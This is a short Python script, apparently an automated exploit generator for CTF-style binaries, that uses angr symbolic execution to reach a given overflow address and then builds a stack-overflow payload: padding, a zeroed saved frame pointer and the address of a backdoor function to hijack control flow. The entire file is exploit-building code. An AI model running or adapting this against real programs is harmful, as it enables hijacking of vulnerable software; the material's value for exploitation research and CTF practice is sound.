import angr
from pwncli import *
def exploit(binary_path,overflow_list,backdoor):
    proj=angr.Project(binary_path)
    for overflow in overflow_list:
        state = proj.factory.entry_state()
        simgr = proj.factory.simgr(state)
        simgr.explore(find=overflow['addr'])
        inp = simgr.found[0].posix.dumps(0)
        payload = inp+b'a'*overflow['buf_size']+p64_ex(0)+p64_ex(backdoor[0]['fcn_addr'])
    return payload
    # import IPython
    # IPython.embed()